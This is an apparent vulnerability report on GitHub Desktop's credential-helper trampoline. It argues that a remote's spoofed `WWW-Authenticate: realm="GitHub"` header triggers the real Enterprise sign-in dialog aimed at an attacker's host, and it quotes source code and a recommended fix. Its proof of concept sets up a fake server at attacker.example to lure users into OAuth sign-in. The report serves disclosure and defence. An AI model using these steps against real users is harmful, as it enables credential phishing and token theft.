### Title
Spoofed `WWW-Authenticate: realm="GitHub"` header from an arbitrary Git remote triggers a real GitHub sign-in flow pointed at the attacker's host - ([File: app/src/lib/trampoline/trampoline-credential-helper.ts])

### Summary
The `git credential-helper` trampoline classifies an unknown Git remote as a GitHub Enterprise host based on a `WWW-Authenticate` header the remote server itself supplies, then automatically opens Desktop's real sign-in dialog against that attacker-controlled origin.

### Finding Description
`getEndpointKind` in `app/src/lib/trampoline/trampoline-credential-helper.ts` decides how to treat the host Git is authenticating against. For any endpoint that isn't already `github.com` or `*.ghe.com`, it inspects the `wwwauth[...]` credential fields that git captured from the server's HTTP response: [1](#0-0) 

If the (attacker-supplied) header contains `realm="GitHub"`, the function returns `'enterprise'` — no verification that the host actually is GitHub Enterprise (unlike the fallback branch a few lines below which does an out-of-band `/meta` probe via `isGitHubHost`).

That classification flows into `getCredential`, which, since no stored account matches this brand-new endpoint, calls `ui.promptForGitHubSignIn(endpoint)`: [2](#0-1) 

`promptForGitHubSignIn` then unconditionally starts the real Enterprise sign-in flow against the attacker's origin and shows the standard `SignIn` popup: [3](#0-2) 

The dialog copy only says "Git requesting credentials to access `<credentialHelperUrl>`" and lets the user "Continue with browser" — it never independently confirms the host is actually a GitHub Enterprise instance the way the `isGitHubHost` `/meta` probe does elsewhere in `api.ts` (`getEndpointKind`'s own fallback path, and `isGitHubHost`): [4](#0-3) 

This is the same class of bug as the M-15 report: a value that should be resolved per-context (here, "is this a trusted GitHub host") is instead trusted from data the counterparty controls, breaking the intended invariant that only genuine GitHub.com/GHE endpoints reach the OAuth/sign-in code path.

### Impact Explanation
An attacker who controls (or proxies) any Git HTTP(S) remote that the victim clones or fetches from can respond to the initial authentication challenge with `WWW-Authenticate: Basic realm="GitHub"`. Desktop's credential-helper trampoline will interpret this as "this is GitHub Enterprise," and since no account is registered for that host, it will pop the real sign-in dialog and drive the user through `beginEnterpriseSignIn` / browser-based OAuth against the attacker's origin. If the user proceeds (believing it's a legitimate GHES prompt triggered by their own clone action), the resulting authorization code/token exchange happens with the attacker's server — leading to unauthorized OAuth completion and potential token/credential exposure tied to whatever the user enters or authorizes, and a spurious `Account` bound in Desktop for a host that isn't actually GitHub.

### Likelihood Explanation
Reaching this path requires no privileged access — merely getting the victim to add and interact with (clone/fetch/push) a Git remote under attacker control, which is a normal, unprompted workflow action in Desktop (adding a repository, cloning a URL, or an existing repo whose remote is later swapped/hijacked via a proxy or MITM-able HTTP redirect). Git itself forwards `WWW-Authenticate` headers to credential helpers as designed, so the attacker only needs to control the HTTP response, not the local machine.

### Recommendation
Do not trust the `realm="GitHub"` value in `WWW-Authenticate` as sufficient evidence of a GitHub host. Require the same verification used in the code's own fallback (`isGitHubHost`'s `/meta` probe with `x-github-request-id` check) before classifying an unknown endpoint as `'enterprise'` and before invoking `promptForGitHubSignIn`. At minimum, the sign-in dialog triggered from the credential helper should surface a stronger warning when the endpoint has not been positively verified as GitHub, distinguishing "claims to be GitHub via header" from "confirmed via `/meta`."

### Proof of Concept
1. Stand up an HTTP server at `https://attacker.example` that, for any `git-upload-pack`/`git-receive-pack` request, responds `401` with header `WWW-Authenticate: Basic realm="GitHub"`.
2. In GitHub Desktop, clone or add an existing repository whose remote points at `https://attacker.example/foo.git` (e.g., `git remote add origin https://attacker.example/foo.git` then perform a fetch/push in Desktop).
3. Git invokes the credential-helper trampoline; `getEndpointKind` sees the `wwwauth[...]` header containing `realm="GitHub"` and returns `'enterprise'` (`app/src/lib/trampoline/trampoline-credential-helper.ts:157-165`).
4. Since no account exists for `attacker.example`, `getCredential` calls `ui.promptForGitHubSignIn('https://attacker.example')`.
5. Desktop opens its real Enterprise sign-in flow (`beginEnterpriseSignIn` + `setSignInEndpoint`) and shows the `SignIn` popup pointed at `attacker.example`, with no additional verification that the host is genuinely a GitHub instance. [5](#0-4) [6](#0-5)

async function getCredential(cred: Credential, store: Store, token: string) {
  const ghCred = await getGitHubCredential(cred, store)

  if (ghCred) {
    return ghCred
  }

  const endpointKind = await getEndpointKind(cred, store)
  const accounts = await store.getAll()

  const endpoint = `${getCredentialUrl(cred)}`
  const apiEndpoint = getAPIEndpoint(endpoint)

  // If it appears as if the endpoint is a GitHub host and we don't have an
  // account for that endpoint then we should prompt the user to sign in.
  if (
    endpointKind !== 'generic' &&
    !accounts.some(a => a.endpoint === apiEndpoint)
  ) {
    if (getIsBackgroundTaskEnvironment(token)) {
      debug('background task environment, skipping prompt')
      return undefined
    }

    const account = await ui.promptForGitHubSignIn(endpoint)

    if (!account) {
      setHasRejectedCredentialsForEndpoint(token, endpoint)
    }

    return credWithAccount(cred, account)
  }

  // GitHub.com/GHE creds are only stored internally
  if (endpointKind !== 'generic') {
    return undefined
  }

  return useExternalCredentialHelper()
    ? getExternalCredential(cred, token)
    : getGenericCredential(cred, token)
}

  // WWW-Authenticate headers and forwards them to the credential helper. We
  // use them as a happy-path to determine if the host is a GitHub host without
  // having to resort to making a request ourselves.
  for (const [k, v] of cred.entries()) {
    if (k.startsWith('wwwauth[')) {
      if (v.includes('realm="GitHub"')) {
        return 'enterprise'
      } else if (/realm="(GitLab|Gitea|Atlassian Bitbucket)"/.test(v)) {
        return 'generic'
      }
    }
  }

  public promptForGitHubSignIn(endpoint: string): Promise<Account | undefined> {
    return new Promise<Account | undefined>(async resolve => {
      const cb = (result: SignInResult) => {
        resolve(result.kind === 'success' ? result.account : undefined)
        this.dispatcher.closePopup(PopupType.SignIn)
      }

      const { hostname, origin } = new URL(endpoint)
      if (hostname === 'github.com') {
        this.dispatcher.beginDotComSignIn(cb)
      } else {
        this.dispatcher.beginEnterpriseSignIn(cb)
        await this.dispatcher.setSignInEndpoint(origin)
      }

      this.dispatcher.showPopup({
        type: PopupType.SignIn,
        isCredentialHelperSignIn: true,
        credentialHelperUrl: endpoint,
      })
    }).catch(e => {
      log.error(`Could not prompt for GitHub sign in`, e)
      return undefined
    })
  }

/**
 * Attempts to determine whether or not the url belongs to a GitHub host.
 *
 * This is a best-effort attempt and may return `undefined` if encountering
 * an error making the discovery request
 */
export async function isGitHubHost(url: string) {
  const { hostname } = new window.URL(url)

  const endpoint =
    hostname === 'github.com' || hostname === 'api.github.com'
      ? getDotComAPIEndpoint()
      : getEnterpriseAPIURL(url)

  if (isDotCom(endpoint) || isGHE(endpoint)) {
    return true
  }

  if (isKnownThirdPartyHost(hostname)) {
    return false
  }

  // github.example.com,
  if (/(^|\.)(github)\./.test(hostname)) {
    return true
  }

  // bitbucket.example.com, etc
  if (/(^|\.)(bitbucket|gitlab)\./.test(hostname)) {
    return false
  }

  if (getEndpointVersion(endpoint) !== null) {
    return true
  }

  // Add a unique identifier to the URL to make sure our certificate error
  // supression only catches this request
  const metaUrl = `${endpoint}/meta?ghd=${crypto.randomUUID()}`

  const ac = new AbortController()
  const timeoutId = setTimeout(() => ac.abort(), 2000)
  suppressCertificateErrorFor(metaUrl)
  try {
    const response = await fetch(metaUrl, {
      headers: { 'user-agent': getUserAgent() },
      signal: ac.signal,
      credentials: 'omit',
      method: 'HEAD',
      redirect: 'error',
    })

    tryUpdateEndpointVersionFromResponse(endpoint, response)

    return response.headers.has('x-github-request-id')
  } catch (e) {
    log.debug(`isGitHubHost: failed with endpoint ${endpoint}`, e)
    return undefined
  } finally {
    clearTimeout(timeoutId)
    clearCertificateErrorSuppressionFor(metaUrl)
  }
}
